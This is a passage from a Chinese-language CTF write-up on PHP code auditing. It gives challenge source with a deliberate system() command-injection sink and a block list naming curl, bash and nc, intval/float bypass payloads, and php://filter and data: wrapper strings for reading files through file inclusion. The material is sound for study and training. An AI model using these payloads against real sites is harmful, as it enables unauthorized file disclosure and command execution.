class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^0-9.]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\./"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"没有这样的数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token markup">&lt;= -999999999999999999 || $numPositve ></span><span class="token operator">=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//在64位系统中 intval()的上限不是2147483647 省省吧</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题要求传入的值类型上不是回文，传入的值与其取整后的值相等，而其取整后的值又要与倒转过来的值取整后的相等，payload如下：</p><pre><code>非预期：?num=00.0-----------------------------------------------------------------------------------------预期解：?num=100000000.0000000010//两个1之间0的个数最少为16个</code></pre><p><strong>研究一下：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//php7.3.4版本</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"1.0000000000000001"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//两个1之间0的个数最少为15个</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//success</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-4-php-三种写法"><a href="#1-2-4-php-三种写法" class="headerlink" title="1.2.4  php 三种写法"></a>1.2.4  php 三种写法</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span> <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"这是一个 PHP 语言的嵌入范例\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"这是第二个 PHP 语言的嵌入范例\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"这是类似 JavaScript 及 VBScript 语法的 PHP 语言嵌入范例"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">echo</span> <span class="token attr-name">("这是类似</span> <span class="token attr-name">ASP</span> <span class="token attr-name">嵌入语法的</span> <span class="token attr-name">PHP</span> <span class="token attr-name">范例");</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-5-伪协议"><a href="#1-2-5-伪协议" class="headerlink" title="1.2.5  伪协议"></a>1.2.5  伪协议</h3><p>php伪协议（php_version&gt;=5.2）</p><h4 id="1-2-5-1-php-input"><a href="#1-2-5-1-php-input" class="headerlink" title="1.2.5.1  php://input"></a>1.2.5.1  php://input</h4><h4 id="1-2-5-2-php-filter"><a href="#1-2-5-2-php-filter" class="headerlink" title="1.2.5.2  php://filter"></a>1.2.5.2  php://filter</h4><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p><p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p><p><img src="/2020/05/09/best-codereview/13.png" alt="img"></p><pre><code>php://filter/convert.base64-encode/resource=flag.phpphp://filter/read=string.rot13/resource=index.php</code></pre><p><strong>tip1： php://filter伪协议可以套一层协议，以此绕过某些过滤</strong></p><pre><code>?category=php://filter/read=convert.base64-encode/woofers/resource=flag或者：php://filter/woofers/convert.base64-encode/resource=flag可以正常读取文件，但include函数包含后也会报错：Unable to create filter (woofers) in &lt;b&gt;/var/www/html/index.php</code></pre><h4 id="1-2-5-3-php-phar"><a href="#1-2-5-3-php-phar" class="headerlink" title="1.2.5.3  php://phar"></a>1.2.5.3  php://phar</h4><p>PHP归档，解压缩协议</p><p>上传包含任何格式文件shell的压缩包，再用phar协议解析</p><h4 id="1-2-5-4-data"><a href="#1-2-5-4-data" class="headerlink" title="1.2.5.4  data"></a>1.2.5.4  data</h4><p><strong>条件：</strong></p><p>allow_url_fopen = On</p><p>allow_url_include = On</p><pre><code>index.php?file=data:text/plain,flag.phpindex.php?file=data:text/plain;base64,ZmxhZy5waHA=</code></pre><h2 id="1-3-常见漏洞类型"><a href="#1-3-常见漏洞类型" class="headerlink" title="1.3  常见漏洞类型"></a>1.3  常见漏洞类型</h2><h3 id="1-3-1-文件包含"><a href="#1-3-1-文件包含" class="headerlink" title="1.3.1  文件包含"></a>1.3.1  文件包含</h3><pre><code>include()require()include_once()require_once()</code></pre><p>这四个函数会将包含的文件作为php文件解析（注意只是解析，而不是将文件内容回显出来，若想回显出来，需要搭配伪协议）：</p><p><strong>1、</strong>require_once表示同名文件只引入一次。                   </p><p><strong>2、</strong>require则会导致一个致命性错误且脚本停止执行。</p><p><strong>3、</strong>include在引入不存在的文件时产生一个警告，但脚本还会继续执行。                                                                       </p><p>可利用的文件包含漏洞条件：<br><strong>1、</strong>include等函数通过动态变量方式引入需要包含的文件，注意通过变量实现文件包含，而不是变量包含。<br><strong>2、</strong>用户可控制该动态变量。</p><h2 id="1-4-特殊类型"><a href="#1-4-特殊类型" class="headerlink" title="1.4  特殊类型"></a>1.4  特殊类型</h2><h3 id="1-4-1-hash长度拓展攻击"><a href="#1-4-1-hash长度拓展攻击" class="headerlink" title="1.4.1  hash长度拓展攻击"></a>1.4.1  hash长度拓展攻击</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="http://note.youdao.com/noteshare?id=d0c2493e5ed494d1f808ead125672bb0&amp;sub=0FDB0421EAFF4BF28470BDAF061F73E2" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=d0c2493e5ed494d1f808ead125672bb0&amp;sub=0FDB0421EAFF4BF28470BDAF061F73E2</a></p><h1 id="2-题目"><a href="#2-题目" class="headerlink" title="2.  题目"></a>2.  题目</h1><h2 id="2-1-WUSTCTF-朴实无华Revenge"><a href="#2-1-WUSTCTF-朴实无华Revenge" class="headerlink" title="2.1  WUSTCTF  朴实无华Revenge"></a><strong>2.1  WUSTCTF  朴实无华Revenge</strong></h2><p> <strong>考点：</strong>浮点精度、md5爆破、命令执行绕过、Linux命令 </p><p><strong>参考链接：</strong></p><p><strong>1、</strong><a href="https://www.gem-love.com/ctf/2283.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2283.html</a></p><p>如果把本篇文章前面的基础看完，再看一下best_rce，这道题就没问题了。（很精彩的一道php代码审计）</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^0-9.]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\./"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"没有这样的数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token markup">&lt;= -999999999999999999 || $numPositve ></span><span class="token operator">=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//在64位系统中 intval()的上限不是2147483647 省省吧</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"more"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"tail"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"less"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"tac"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"sort"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"nl"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/['\*\"[?]/"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'非预期修复*2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" 